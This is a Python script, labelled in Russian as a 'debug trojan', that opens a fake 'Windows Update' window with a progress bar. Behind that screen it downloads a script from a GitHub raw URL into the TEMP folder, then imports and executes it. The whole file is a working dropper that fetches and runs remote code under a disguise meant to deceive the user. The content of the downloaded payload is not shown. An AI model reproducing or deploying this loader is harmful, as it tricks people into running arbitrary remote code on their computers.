# trojan_hama_debug.py - ОТЛАДОЧНАЯ ВЕРСИЯ
import os
import sys
import time
import requests
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox
from pathlib import Path

QUIZ_URL = "https://raw.githubusercontent.com/qwert369qwe/dvoian/main/hamster_quiz.py"
DOWNLOAD_PATH = Path(os.getenv('TEMP')) / "hamster_quiz.py"

def download_quiz():
    try:
        print(f"[1] Скачиваю с {QUIZ_URL}")
        response = requests.get(QUIZ_URL, timeout=10)
        print(f"[2] HTTP статус: {response.status_code}")
        
        with open(DOWNLOAD_PATH, 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        print(f"[3] Файл сохранён: {DOWNLOAD_PATH}")
        print(f"[4] Размер файла: {DOWNLOAD_PATH.stat().st_size} байт")
        return True
    except Exception as e:
        print(f"[ОШИБКА] download_quiz: {e}")
        return False

def run_quiz():
    try:
        print(f"[5] Запускаю: {sys.executable}")
        print(f"[6] Скрипт: {DOWNLOAD_PATH}")
        
        # Проверяем, существует ли файл
        if not DOWNLOAD_PATH.exists():
            print(f"[ОШИБКА] Файл не найден: {DOWNLOAD_PATH}")
            return False
        
        # Пробуем запустить
        process = subprocess.Popen([sys.executable, str(DOWNLOAD_PATH)], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE)
        print(f"[7] Процесс запущен, PID: {process.pid}")
        return True
    except Exception as e:
        print(f"[ОШИБКА] run_quiz: {e}")
        return False

def test_quiz_directly():
    """Проверяем, работает ли викторина напрямую"""
    try:
        print("[ТЕСТ] Пробую импортировать файл...")
        import importlib.util
        spec = importlib.util.spec_from_file_location("hamster_quiz", DOWNLOAD_PATH)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        print("[ТЕСТ] Файл загрузился без ошибок!")
        return True
    except Exception as e:
        print(f"[ТЕСТ] Ошибка в файле викторины: {e}")
        return False

def show_fake_download():
    win = tk.Tk()
    win.title("Windows Update")
    win.geometry("450x250")
    win.configure(bg='#0078D7')
    win.resizable(False, False)
    
    tk.Label(win, text="ЦЕНТР ОБНОВЛЕНИЯ WINDOWS", 
             font=("Segoe UI", 12, "bold"), bg='#0078D7', fg='white').pack(pady=15)
    
    tk.Label(win, text="Установка критических обновлений...\nНе выключайте компьютер!",
             font=("Segoe UI", 9), bg='#0078D7', fg='white').pack()
    
    progress = ttk.Progressbar(win, length=350, mode='determinate')
    progress.pack(pady=20)
    
    status = tk.Label(win, text="0%", bg='#0078D7', fg='yellow')
    status.pack()
    
    debug_text = tk.Text(win, height=4, width=50, bg='#005a9e', fg='white', font=("Consolas", 8))
    debug_text.pack(pady=10)
    debug_text.insert('1.0', "Лог:\n")
    
    def log(msg):
        debug_text.insert('end', f"{msg}\n")
        debug_text.see('end')
        win.update()
    
    def animate():
        for i in range(101):
            progress['value'] = i
            status.config(text=f"Загрузка... {i}%")
            win.update()
            time.sleep(0.02)
        
        log("Загрузка завершена, проверяем файл...")
        
        if not DOWNLOAD_PATH.exists():
            log("ОШИБКА: Файл не скачался!")
            messagebox.showerror("Ошибка", "Файл не скачался!")
            return
        
        log(f"Файл есть, размер: {DOWNLOAD_PATH.stat().st_size} байт")
        log("Проверяем валидность Python файла...")
        
        if test_quiz_directly():
            log("Файл валиден, запускаем...")
            win.destroy()
            run_quiz()
        else:
            log("ОШИБКА: Файл повреждён!")
            messagebox.showerror("Ошибка", "Файл викторины повреждён!")
    
    # Запускаем скачивание в потоке
    import threading
    def download_thread():
        log("Начинаем скачивание...")
        if download_quiz():
            log("Скачивание успешно!")
        else:
            log("ОШИБКА скачивания!")
    
    threading.Thread(target=download_thread, daemon=True).start()
    
    # Запускаем анимацию
    win.after(100, animate)
    win.mainloop()

if __name__ == "__main__":
    print("=== ОТЛАДОЧНЫЙ ТРОЯН ====")
    print(f"Путь сохранения: {DOWNLOAD_PATH}")
    
    # Очищаем старый файл
    if DOWNLOAD_PATH.exists():
        print("Удаляю старый файл...")
        os.remove(DOWNLOAD_PATH)
    
    show_fake_download()
